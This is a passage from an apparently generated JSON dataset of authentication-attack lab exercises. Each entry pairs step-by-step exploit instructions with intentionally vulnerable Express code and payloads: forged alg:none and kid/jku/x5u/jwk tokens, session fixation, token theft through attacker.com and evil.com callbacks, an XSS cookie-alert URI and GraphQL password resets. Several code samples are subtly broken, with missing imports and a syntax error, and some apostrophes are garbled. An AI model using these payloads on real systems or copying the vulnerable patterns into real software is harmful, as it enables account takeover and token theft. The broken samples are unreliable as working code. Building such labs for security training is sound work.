    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const bodyParser = require('body-parser'); app.use(bodyParser.json()); const SECRET = 'letmein'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username, admin: false }, SECRET); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers['authorization']; if (!authHeader) return res.status(401).send('Missing token'); const token = authHeader.split(' ')[1]; try { const decoded = jwt.verify(token, SECRET); if (decoded.admin) return res.send('Admin Access Granted'); return res.status(403).send('Forbidden'); } catch (err) { return res.status(400).send('Invalid token'); } }); app.listen(4000, () => console.log('JWT Lab running on port 4000'));",
    "payloads": [
      "jwt_tool original_token -C -p '{\"admin\":true}' -s letmein",
      "jwt.io using header/payload re-sign with secret 'letmein'",
      "Authorization: Bearer <new_token_with_admin_true>"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Weak Token Binding",
    "Lab Description": "The application assigns a session cookie before login and fails to regenerate it after authentication. Attackers can set a known session ID and trick the victim into logging in with it. To solve: Fix a session ID, trick the victim to log in, then reuse the session ID to access /my-account as the victim.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to observe that the session cookie is issued pre-authentication and not updated post-login.",
      "Set a fixed session ID using Burp's cookie editor and open the login page with this cookie.",
      "Host a malicious page that opens the login URL with the attacker's fixed session cookie (social engineering).",
      "After the victim logs in, reuse the same session ID in a new request to access the /my-account endpoint.",
      "Confirm access to victim's account without knowing their credentials."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const users = { 'alice': { password: '12345' } }; const sessions = {}; app.use((req, res, next) => { if (!req.cookies.sid) { const sid = Math.random().toString(36).substring(2); res.cookie('sid', sid); sessions[sid] = {}; } next(); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] && users[username].password === password) { const sid = req.cookies.sid; sessions[sid].user = username; res.send('Login successful'); } else { res.send('Login failed'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sid; const user = sessions[sid]?.user; if (user) res.send(`Welcome back, ${user}`); else res.status(401).send('Please log in'); }); app.listen(4000, () => console.log('Session Fixation Lab running on port 4000'));",
    "payloads": [
      "Set-Cookie: sid=attacker123;",
      "GET /login (with sid=attacker123)",
      "Reuse sid=attacker123 after victim login"
    ]
  },
  {
    "Lab scenario": "OAuth Implicit Flow Token Theft via Referer Leak",
    "Lab Description": "This lab uses OAuth 2.0 implicit flow to obtain access tokens via redirects. The redirection target page leaks the access token in the Referer header. To solve: Intercept the redirect and steal the token using a malicious third-party page, then access /oauth/user-info as the victim.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Analyze the OAuth login flow with Burp Suite and confirm that the access token is returned in the URL fragment (#access_token=...).",
      "Observe that the final redirect goes to a page that loads external content, such as an image or script.",
      "Host a malicious image on your server and inject it into the redirect target page to capture Referer headers.",
      "Trigger the OAuth login and have the redirect go through your image endpoint, capturing the access token in the Referer.",
      "Use the stolen token in a Bearer Authorization header to access /oauth/user-info."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/redirect', (req, res) => { res.send('<html><body><img src=\"http://attacker.com/log?ref='+req.headers.referer+'\" /></body></html>'); }); app.get('/oauth/user-info', (req, res) => { const auth = req.headers['authorization']; if (!auth || !auth.startsWith('Bearer ')) return res.status(401).send('Missing token'); const token = auth.split(' ')[1]; if (token === 'valid-oauth-token') res.send('User info: carlos'); else res.status(403).send('Invalid token'); }); app.listen(4000, () => console.log('OAuth Token Leak Lab running on port 4000'));",
    "payloads": [
      "OAuth login flow ending at /oauth/redirect",
      "Malicious image hosted at http://attacker.com/log",
      "GET /oauth/user-info with Authorization: Bearer valid-oauth-token"
    ]
  },
  {
    "Lab scenario": "JWT signature 'none' bypass in Authorization header",
    "Lab Description": "The application uses JWT tokens for authentication but does not validate the token's signature algorithm properly. It allows an attacker to manipulate the JWT by setting the `alg` header to 'none'. The application accepts unsigned tokens. To solve: forge a JWT with `alg: none` to access Carlos's account.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept a valid login request using Burp Suite and observe the JWT in the Authorization header after successful login.",
      "2. Decode the JWT using jwt.io or Postman to examine the header, payload, and signature.",
      "3. Craft a new JWT with `alg: none`, set `sub: carlos`, and remove the signature.",
      "4. Replace the original JWT in the Authorization header with your forged token using Burp Repeater.",
      "5. Send a GET request to /my-account using the forged token and verify access to Carlos\u00e2\u20ac\u2122s account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = [{ username: 'carlos', role: 'user' }]; app.get('/my-account', (req, res) => { const authHeader = req.headers['authorization']; const token = authHeader && authHeader.split(' ')[1]; try { const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.sub) { res.send(`Account details for ${payload.payload.sub}`); } else { res.status(401).send('Unauthorized'); } } catch (e) { res.status(401).send('Invalid token'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT None Bypass Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJyb2xlIjoiYWRtaW4ifQ.",
      "{\"alg\":\"none\"}.{ \"sub\":\"carlos\" }.",
      "Authorization: Bearer <forged-token>"
    ]
  },
  {
    "Lab scenario": "Session fixation in pre-login cookie assignment",
    "Lab Description": "This application sets a session ID cookie before authentication. Upon login, it reuses the existing session instead of regenerating it, allowing session fixation attacks. To solve: fix a session, get Carlos to log in using it, then hijack the session.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use OWASP ZAP or Burp Suite to access the login page and capture the `sessionId` cookie issued pre-login.",
      "2. Send Carlos a phishing email with a crafted link to the login page that forces use of the session ID you control.",
      "3. Once Carlos logs in, use the fixed session ID cookie to access /my-account as Carlos.",
      "4. Send the session cookie with a GET request to /my-account using Burp Repeater.",
      "5. Confirm unauthorized access to Carlos's account using the fixed session."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'hunter2' }; app.get('/login', (req, res) => { if (!req.cookies.sessionId) { res.cookie('sessionId', Math.random().toString(36).substring(2)); } res.send('Login Page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.sessionId] = username; res.redirect('/my-account'); } else { res.status(401).send('Login failed'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sessionId]; if (user) res.send(`Welcome back, ${user}`); else res.status(403).send('Access denied'); }); app.listen(4000, () => console.log('Session Fixation Lab running on http://localhost:4000'));",
    "payloads": [
      "Cookie: sessionId=fixed123",
      "http://target-app.com/login?sessionId=fixed123",
      "Set-Cookie: sessionId=fixed123"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage via redirect URI manipulation",
    "Lab Description": "The app implements OAuth login but does not properly validate redirect URIs during token exchange. An attacker can manipulate the redirect_uri parameter to capture tokens. To solve: leak Carlos\u00e2\u20ac\u2122s token using a crafted malicious redirect_uri.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to initiate the OAuth flow and identify the request containing the `redirect_uri` parameter.",
      "2. Modify the `redirect_uri` to a domain you control (e.g., https://evil.com/callback) using Burp Repeater.",
      "3. Send the modified authorization request to the victim (Carlos) to trick them into authenticating.",
      "4. Capture the access_token from your controlled redirect endpoint.",
      "5. Use Postman to send a request with the captured token to /my-account and access Carlos\u00e2\u20ac\u2122s data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const querystring = require('querystring'); const app = express(); const tokens = { 'carlos': 'carlos-token-xyz' }; app.get('/oauth/authorize', (req, res) => { const { redirect_uri, state, user } = req.query; if (tokens[user]) { const uri = `${redirect_uri}?access_token=${tokens[user]}&state=${state}`; res.redirect(uri); } else { res.status(400).send('Invalid user'); } }); app.get('/my-account', (req, res) => { const token = req.query.access_token; const user = Object.keys(tokens).find(u => tokens[u] === token); if (user) res.send(`Hello ${user}, this is your account.`); else res.status(403).send('Unauthorized'); }); app.listen(4000, () => console.log('OAuth Redirect URI Lab running on http://localhost:4000'));",
    "payloads": [
      "https://attacker.com/callback?access_token=carlos-token-xyz",
      "GET /oauth/authorize?redirect_uri=https://attacker.com/callback&user=carlos&state=123",
      "GET /my-account?access_token=carlos-token-xyz"
    ]
  },
  {
    "Lab scenario": "JWT alg:none bypass in REST API authentication",
    "Lab Description": "The lab's authentication system uses JWT tokens with improper signature validation. The application fails to verify the token signature when the alg field is set to 'none'. To solve: craft a valid JWT token with admin privileges without knowing the secret key.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept a valid JWT token using Burp Suite while logging in as a normal user",
      "Decode the token using jwt.io to analyze its structure",
      "Modify the algorithm to 'none' and change the role to 'admin'",
      "Remove the signature portion of the JWT (after the last dot)",
      "Send the modified token in the Authorization header to access admin endpoints"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/admin', (req, res) => {\n  const token = req.headers.authorization.split(' ')[1];\n  const decoded = jwt.decode(token, { complete: true });\n  \n  if (decoded.header.alg === 'none') {\n    if (decoded.payload.role === 'admin') {\n      return res.send('Admin access granted');\n    }\n  } else {\n    try {\n      jwt.verify(token, 'secretkey');\n      if (decoded.payload.role === 'admin') {\n        return res.send('Admin access granted');\n      }\n    } catch (e) {\n      return res.status(403).send('Invalid token');\n    }\n  }\n  \n  res.status(403).send('Access denied');\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiY2FybG9zIiwicm9sZSI6ImFkbWluIn0.",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0."
    ]
  },
  {
    "Lab scenario": "GraphQL introspection query exposing authentication fields",
    "Lab Description": "The GraphQL endpoint has introspection enabled, revealing sensitive authentication fields and mutations. The application exposes password reset functionality through undocumented GraphQL mutations. To solve: exploit the exposed mutation to reset the admin password.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to send introspection queries to the GraphQL endpoint",
      "Analyze the schema to discover hidden mutations using GraphQL Voyager",
      "Identify the passwordReset mutation and its required parameters",
      "Craft a mutation request with the admin email and new password",
      "Verify success by logging in with the new credentials"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const { ApolloServer, gql } = require('apollo-server-express');\nconst express = require('express');\n\nconst typeDefs = gql`\n  type Mutation {\n    passwordReset(email: String!, newPassword: String!): Boolean\n  }\n`;\n\nconst resolvers = {\n  Mutation: {\n    passwordReset: (_, { email, newPassword }) => {\n      const user = users.find(u => u.email === email);\n      if (user) {\n        user.password = newPassword;\n        return true;\n      }\n      return false;\n    }\n  }\n};\n\nconst server = new ApolloServer({ typeDefs, resolvers, introspection: true });\nconst app = express();\nserver.applyMiddleware({ app });\n\napp.listen({ port: 4000 }, () =>\n  console.log(`GraphQL lab running at http://localhost:4000${server.graphqlPath}`)\n);",
    "payloads": [
      "{\"query\":\"mutation { passwordReset(email: \\\"admin@lab.com\\\", newPassword: \\\"hacked123\\\") }\"}",
      "{\"query\":\"mutation {\\n  __schema {\\n    mutationType {\\n      fields {\\n        name\\n        description\\n      }\\n    }\\n  }\\n}\"}",
      "{\"query\":\"mutation($email: String!, $newPass: String!) { passwordReset(email: $email, newPassword: $newPass) }\",\"variables\":{\"email\":\"admin@lab.com\",\"newPass\":\"pwned!\"}}"
    ]
  },
  {
    "Lab scenario": "OAuth token hijacking through open redirect",
    "Lab Description": "The OAuth implementation has an open redirect vulnerability in the callback URL validation. The application fails to properly validate redirect URLs during OAuth token exchange. To solve: steal an OAuth token by tricking a user into authenticating through your malicious redirect.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Identify the OAuth callback endpoint using OWASP ZAP",
      "Craft a malicious URL with a controlled redirect parameter",
      "Set up a netcat listener to capture incoming tokens",
      "Social engineer a victim to click the crafted URL",
      "Intercept the token and use it to authenticate as the victim"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst clients = {\n  'client123': {\n    secret: 'secret123',\n    redirectUris: ['https://legit-client.com/callback']\n  }\n};\n\napp.get('/oauth/callback', (req, res) => {\n  const { code, state, redirect_uri } = req.query;\n  const clientId = req.query.client_id;\n  \n  if (!clients[clientId]) {\n    return res.status(400).send('Invalid client');\n  }\n  \n  if (code && redirect_uri) {\n    return res.redirect(`${redirect_uri}?code=${code}&state=${state}`);\n  }\n  \n  res.status(400).send('Invalid request');\n});\n\napp.listen(3000);",
    "payloads": [
      "https://vulnerable-oauth.com/oauth/callback?client_id=client123&redirect_uri=https://attacker.com&response_type=code&state=123",
      "https://vulnerable-oauth.com/oauth/callback?client_id=client123&redirect_uri=http://localhost:9000&response_type=token",
      "https://vulnerable-oauth.com/oauth/callback?client_id=client123&redirect_uri=data:text/html,<script>alert(document.cookie)</script>&response_type=code"
    ]
  },
  {
    "Lab scenario": "Session fixation in SOAP API authentication",
    "Lab Description": "The lab's SOAP-based authentication system is vulnerable to session fixation attacks. The application accepts pre-defined session IDs during login without proper validation. To solve: fixate a session ID and trick an admin into authenticating with it to gain privileged access.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP to intercept a login request to /soap-auth endpoint",
      "Add a custom SessionID header with a predictable value (e.g., 'fixed123')",
      "Note the Set-Cookie response confirming session acceptance",
      "Craft a phishing link containing the fixed session ID",
      "Verify admin access by reusing the session ID after victim login"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst soap = require('soap');\nconst app = express();\n\nconst sessions = {};\n\napp.post('/soap-auth', (req, res) => {\n  const xml = req.rawBody;\n  const parser = new xml2js.Parser();\n  parser.parseString(xml, (err, result) => {\n    const sessionId = req.headers['sessionid'] || uuidv4();\n    sessions[sessionId] = {\n      user: result['soap:Envelope']['soap:Body'][0].Login[0].Username[0],\n      role: 'user'\n    };\n    res.set('Set-Cookie', `SESSION=${sessionId}; HttpOnly`);\n    res.send('<soap:Success/>');\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "<soap:Envelope><soap:Body><Login><Username>admin</Username><Password>any</Password></Login></soap:Body></soap:Envelope>",
      "POST /soap-auth HTTP/1.1\nHost: vulnerable.com\nSessionID: fixed123\nContent-Type: text/xml\n\n<soap:Envelope><soap:Body><Login><Username>victim</Username><Password>p@ssw0rd</Password></Login></soap:Body></soap:Envelope>",
      "GET /admin-panel HTTP/1.1\nHost: vulnerable.com\nCookie: SESSION=fixed123"
    ]
  },
  {
    "Lab scenario": "JWT kid header path traversal in REST microservice",
    "Lab Description": "The JWT validation service is vulnerable to key path traversal via the kid header parameter. The application uses the kid value to load verification keys without sanitization. To solve: craft a JWT that forces the server to use a predictable public key for verification.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture a valid JWT using Burp Suite and decode its structure",
      "Modify the kid header to point to /dev/null or /proc/self/fd/0",
      "Sign the token with an empty key using jwt_tool",
      "Brute-force the admin endpoint with the crafted token",
      "Verify access to privileged endpoints with the valid token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst fs = require('fs');\nconst app = express();\n\napp.post('/verify-token', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {complete: true});\n  \n  const keyPath = `/keys/${decoded.header.kid}`;\n  const pubKey = fs.readFileSync(keyPath);\n  \n  jwt.verify(token, pubKey, (err, payload) => {\n    if (err) return res.status(403).send('Invalid token');\n    res.json({access: payload.role === 'admin' ? 'granted' : 'denied'});\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsImtpZCI6Ii4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.FakeSignature",
      "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6Ii9wcm9jL3NlbGYvZmQvMCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIiwiYWRtaW4iOnRydWV9.FakeSig",
      "eyJraWQiOiIva2V5cy8uLi8uLi9ldGMvcGFzc3dkIiwidHlwIjoiSldUIiwiYWxnIjoiSFMyNTYifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.FakeSignature"
    ]
  },
  {
    "Lab scenario": "OAuth token leakage through verbose error messages",
    "Lab Description": "The OAuth token endpoint leaks sensitive information through detailed error responses. The application reveals valid tokens in error messages when malformed requests are sent. To solve: extract a valid OAuth token by analyzing error responses and use it to access protected resources.",
    "Difficulty Level": "Easy",
    "Solution Steps": [
      "Use Postman to send malformed token requests to /oauth/token",
      "Analyze error responses for leaked token fragments",
      "Reconstruct complete tokens from error message snippets",
      "Validate tokens by accessing /api/me endpoint",
      "Exfiltrate user data using the stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst tokens = {\n  'abc123': {user: 'admin', scope: ['read','write']},\n  'def456': {user: 'guest', scope: ['read']}\n};\n\napp.post('/oauth/token', (req, res) => {\n  try {\n    const token = req.body.access_token;\n    if (!token) throw new Error('Missing token. Valid tokens: '+Object.keys(tokens).join(','));\n    if (!tokens[token]) throw new Error(`Invalid token. Similar valid tokens: ${Object.keys(tokens).filter(t => t.startsWith(token.substring(0,2))}`);\n    res.json(tokens[token]);\n  } catch (err) {\n    res.status(400).json({error: err.message});\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "access_token=a&grant_type=client_credentials",
      "{\"access_token\":\"ab\",\"token_type\":\"bearer\"}",
      "grant_type=password&username=admin&password=guess&scope=read write"
    ]
  },
  {
    "Lab scenario": "JWT role escalation via unsigned JWKS endpoint",
    "Lab Description": "The application's JSON Web Key Set (JWKS) endpoint returns unsigned public keys that can be manipulated to forge admin tokens. The application [fails to validate key signatures during JWT verification]. To solve: [craft a valid JWT with admin privileges by injecting a malicious key into the JWKS response].",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept JWT flow using Burp Suite and identify jku header pointing to /jwks.json",
      "Modify JWKS response to include a crafted RSA public key using Postman",
      "Generate a new key pair and sign a token with the private key using jwt_tool",
      "Inject the modified jku header pointing to attacker-controlled endpoint",
      "Verify admin access by accessing /admin/dashboard with forged token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\napp.get('/jwks.json', (req, res) => {\n  res.json({\n    keys: [{\n      kty: 'RSA',\n      e: 'AQAB',\n      kid: '1',\n      n: 'unsafe-key-modulus'\n    }]\n  });\n});\n\napp.post('/verify', (req, res) => {\n  const token = req.body.token;\n  const jku = jwt.decode(token, {complete: true}).header.jku;\n  \n  fetch(jku)\n    .then(r => r.json())\n    .then(keys => {\n      const key = keys.keys[0];\n      jwt.verify(token, key, {algorithms: ['RS256']}, (err, decoded) => {\n        res.json({access: decoded?.admin ? 'granted' : 'denied'});\n      });\n    });\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsImprdSI6Imh0dHA6Ly9hdHRhY2tlci5jb20vandrcy5qc29uIn0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.FakeSig",
      "{\"keys\":[{\"kty\":\"RSA\",\"e\":\"AQAB\",\"kid\":\"hacked\",\"n\":\"attacker-modulus\"}]}",
      "eyJraWQiOiJoYWNrZWQiLCJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NSIsImFkbWluIjp0cnVlfQ.FakeSig"
    ]
  },
  {
    "Lab scenario": "OAuth token swapping through parameter pollution",
    "Lab Description": "The OAuth 2.0 implementation is vulnerable to access token substitution via duplicate parameter injection. The application [processes multiple token parameters inconsistently]. To solve: [steal an admin access token by injecting duplicate token parameters in the authorization flow].",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture OAuth flow using OWASP ZAP and note token exchange endpoint",
      "Intercept /oauth/callback request and add duplicate access_token parameter",
      "Chain the attack by first obtaining a low-privilege token from the provider",
      "Inject the stolen admin token as second parameter while preserving original",
      "Verify privilege escalation by accessing /api/admin with swapped token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\napp.get('/oauth/callback', (req, res) => {\n  const tokens = req.query.access_token || [];\n  const token = Array.isArray(tokens) ? tokens.pop() : tokens;\n  \n  db.findUserByToken(token, (err, user) => {\n    if (user) {\n      req.session.user = user;\n      res.redirect('/dashboard');\n    } else {\n      res.status(403).send('Invalid token');\n    }\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "/oauth/callback?code=abc123&access_token=legitToken&access_token=stolenAdminToken",
      "GET /api/data?access_token=userToken&access_token=adminToken",
      "POST /token\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=authorization_code&code=SplxlO&access_token=admin123"
    ]
  },
  {
    "Lab scenario": "Session hijacking through GraphQL batch query abuse",
    "Lab Description": "The GraphQL endpoint processes batch operations with inconsistent session handling. The application [executes multiple mutations in a single request while maintaining session state]. To solve: [hijack an admin session by injecting session ID into batch mutation operation].",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Discover GraphQL endpoint using Burp Suite scanner",
      "Capture valid session cookie through normal login flow",
      "Craft batch mutation containing session hijack payload using GraphiQL",
      "Chain session ID swap mutation with privilege escalation query",
      "Verify session takeover by querying admin-only data fields"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst { graphqlHTTP } = require('express-graphql');\nconst app = express();\n\nconst schema = new GraphQLSchema({\n  mutation: new GraphQLObjectType({\n    name: 'RootMutationType',\n    fields: {\n      updateSession: {\n        type: SessionType,\n        args: { sessionId: { type: GraphQLString } },\n        resolve: (_, args, req) => {\n          req.session.id = args.sessionId;\n          return req.session;\n        }\n      }\n    }\n  })\n});\n\napp.use('/graphql', graphqlHTTP({\n  schema: schema,\n  context: { session: { id: null } }\n}));\n\napp.listen(3000);",
    "payloads": [
      "[{\"query\":\"mutation {updateSession(sessionId: \\\"adminSession\\\"){id}}\"},{\"query\":\"query {secretData {classified}}\"}]",
      "{\"query\":\"mutation($sid: String!) {a: updateSession(sessionId: $sid) {id} b: __typename}\",\"variables\":{\"sid\":\"stolenSession123\"}}",
      "POST /graphql\nContent-Type: application/json\n\n[{\"query\":\"mutation {login(username: \\\"user\\\", password: \\\"pass\\\") {sessionId}}\"},{\"query\":\"mutation {updateSession(sessionId: \\\"admin\\\") {id}}\"}]"
    ]
  },
  {
    "Lab scenario": "JWT public key injection via x5u header",
    "Lab Description": "The JWT validation service trusts arbitrary x5u header URLs to fetch verification certificates. The application [fails to validate certificate chain authenticity when processing x5u headers]. To solve: [forge a valid admin token by injecting a malicious x5u URL pointing to attacker-controlled X.509 certificate].",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and observe x5u header usage",
      "Generate self-signed X.509 certificate with admin privileges using OpenSSL",
      "Host malicious certificate on attacker-controlled server",
      "Craft JWT with x5u pointing to malicious certificate and sign with private key",
      "Verify admin access by submitting token to /admin-api endpoint"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst https = require('https');\nconst app = express();\n\napp.post('/verify-token', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {complete: true});\n  \n  https.get(decoded.header.x5u, (certRes) => {\n    let certData = '';\n    certRes.on('data', (chunk) => certData += chunk);\n    certRes.on('end', () => {\n      jwt.verify(token, certData, (err, payload) => {\n        res.json({admin: payload?.admin || false});\n      });\n    });\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCIsIng1dSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL21hbGljaW91cy5jZXIifQ.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.FakeSig",
      "{\"token\":\"eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHA6Ly9sb2NhbGhvc3Q6OTAwMC9ldmlsLmNlciJ9.eyJzdWIiOiIxMjM0NSIsImFkbWluIjp0cnVlfQ.FakeSig\"}",
      "POST /verify-token\nContent-Type: application/json\n\n{\"token\":\"eyJhbGciOiJSUzI1NiIsIng1dSI6Imh0dHBzOi8vZXZpbC5leGUvY2VydC5wZW0ifQ.eyJ1c2VybmFtZSI6ImFkbWluIn0.FakeSig\"}"
    ]
  },
  {
    "Lab scenario": "OAuth token replay through state parameter injection",
    "Lab Description": "The OAuth implementation fails to validate state parameter binding during token redemption. The application [accepts previously used authorization codes when accompanied by a new state parameter]. To solve: [intercept an authorization code and replay it with a forged state parameter to obtain fresh access tokens].",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Intercept OAuth flow using OWASP ZAP and capture /callback request",
      "Note authorization code and original state parameter values",
      "Replay authorization code to /token endpoint with new state parameter",
      "Chain the attack by maintaining multiple valid state values",
      "Verify token validity by accessing user profile with stolen token"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst app = express();\n\nconst authCodes = {};\nconst usedStates = new Set();\n\napp.get('/oauth/callback', (req, res) => {\n  const {code, state} = req.query;\n  authCodes[code] = {state, valid: true};\n  res.redirect(`/exchange?code=${code}&state=${state}`);\n});\n\napp.post('/oauth/token', (req, res) => {\n  const {code, state} = req.body;\n  if (authCodes[code]?.valid && !usedStates.has(state)) {\n    usedStates.add(state);\n    res.json({access_token: 'freshToken'});\n  } else {\n    res.status(400).json({error: 'Invalid request'});\n  }\n});\n\napp.listen(3000);",
    "payloads": [
      "/oauth/token\nContent-Type: application/x-www-form-urlencoded\n\ncode=SplxlO&state=newState123",
      "{\"code\":\"abc123\",\"state\":\"injected_state\",\"grant_type\":\"authorization_code\"}",
      "POST /token\ncode=MzFjNTk5&state=hijacked_state&client_id=legit_client"
    ]
  },
  {
    "Lab scenario": "Session fixation through WebSocket handshake hijacking",
    "Lab Description": "The WebSocket authentication handshake accepts arbitrary session identifiers. The application [assigns privileged sessions based on unvalidated WS-Session headers during WebSocket upgrades]. To solve: [fixate a privileged session ID through WebSocket handshake manipulation and hijack admin access].",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept WebSocket upgrade request using Burp Suite",
      "Inject WS-Session header with predictable session ID",
      "Capture valid admin session cookie through XSS or phishing",
      "Reuse captured session ID in WebSocket handshake",
      "Verify admin access by subscribing to privileged WebSocket channels"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst WebSocket = require('ws');\nconst app = express();\n\nconst server = app.listen(3000);\nconst wss = new WebSocket.Server({ server });\n\nwss.on('connection', (ws, req) => {\n  const sessionId = req.headers['ws-session'] || Math.random().toString(36).substring(2);\n  \n  db.findSession(sessionId, (err, session) => {\n    if (session?.admin) {\n      ws.send('ADMIN_ACCESS_GRANTED');\n    }\n  });\n});",
    "payloads": [
      "GET /ws HTTP/1.1\nHost: vulnerable.com\nUpgrade: websocket\nConnection: Upgrade\nWS-Session: admin-fixed-session\nSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==\nSec-WebSocket-Version: 13",
      "{\"headers\":{\"WS-Session\":\"stolen-session-id\"}}",
      "wss://vulnerable.com/ws?session_id=injected-admin-session"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion via jwk header injection",
    "Lab Description": "The JWT validation endpoint is vulnerable to algorithm confusion attacks through JWK header injection. The application [trusts client-provided JWK headers when verifying tokens signed with symmetric keys]. To solve: [forge a valid admin token by injecting a malicious JWK header and signing with the public key as if it were HMAC].",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Intercept valid JWT using Burp Suite and analyze header structure",
      "Extract public key from application's /jwks.json endpoint",
      "Craft new token with jwk header containing extracted public key",
      "Sign token using public key as HMAC secret with HS256 algorithm",
      "Verify admin access by submitting forged token to /admin-api"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express');\nconst jwt = require('jsonwebtoken');\nconst app = express();\n\nconst publicKey = '-----BEGIN PUBLIC KEY-----\\nMFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBA...';\n\napp.post('/verify-token', (req, res) => {\n  const token = req.body.token;\n  const decoded = jwt.decode(token, {complete: true});\n  \n  let key = publicKey;\n  if (decoded.header.jwk) {\n    key = decoded.header.jwk;\n  }\n  \n  jwt.verify(token, key, (err, payload) => {\n    res.json({admin: payload?.admin || false});\n  });\n});\n\napp.listen(3000);",
    "payloads": [
      "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImp3ayI6eyJrdHkiOiJSU0EiLCJuIjoiT...In0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6dHJ1ZX0.FakeSig",
